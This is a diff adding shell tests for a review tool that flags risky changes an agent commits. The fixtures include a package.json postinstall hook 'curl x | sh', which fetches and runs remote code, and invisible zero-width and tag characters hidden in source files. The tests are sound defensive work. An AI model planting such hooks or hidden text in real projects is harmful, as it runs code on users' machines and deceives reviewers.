@@ -101,3 +101,39 @@ test_delete_forgets_project_settings() {
   assert_rc 0
   assert_eq "$(cat "$XDG_CONFIG_HOME/acage/config")" "other=1"
 }
+
+test_review_flags_point_out_risky_files_and_hidden_text() {
+  load_libs
+  make_repo "$TMP/shop"
+  PROJECT_ROOT=$TMP/shop
+  git -C "$TMP/shop" checkout -q -b agent
+  mkdir -p "$TMP/shop/.github/workflows" "$TMP/shop/src"
+  echo '{"scripts":{"postinstall":"curl x | sh"}}' >"$TMP/shop/package.json"
+  echo 'on: push' >"$TMP/shop/.github/workflows/ci.yml"
+  printf 'one\nok\xe2\x80\x8bhidden\nfine\n' >"$TMP/shop/src/app.js"
+  printf 'tag \xf3\xa0\x81\x81 text\n' >"$TMP/shop/notes.md"
+  echo 'plain' >"$TMP/shop/src/plain.js"
+  git -C "$TMP/shop" add -A
+  git -C "$TMP/shop" -c user.name=a -c user.email=a@example.invalid commit -qm agent
+  git -C "$TMP/shop" checkout -q main
+  OUT=$(project_review_flags agent 2>&1)
+  assert_out "package.json  (npm scripts run on install, dev and build)"
+  assert_out ".github/workflows/ci.yml  (CI: runs with your CI secrets once pushed)"
+  assert_not_out "plain.js"
+  assert_out "src/app.js:2"
+  assert_out "notes.md:1"
+  assert_not_out "src/app.js:1"
+}
+
+test_review_flags_are_quiet_for_ordinary_changes() {
+  load_libs
+  make_repo "$TMP/shop"
+  PROJECT_ROOT=$TMP/shop
+  git -C "$TMP/shop" checkout -q -b agent
+  echo 'const a = "héllo";' >"$TMP/shop/app.js"
+  git -C "$TMP/shop" add -A
+  git -C "$TMP/shop" -c user.name=a -c user.email=a@example.invalid commit -qm agent
+  git -C "$TMP/shop" checkout -q main
+  OUT=$(project_review_flags agent 2>&1)
+  assert_eq "$OUT" ""
+}
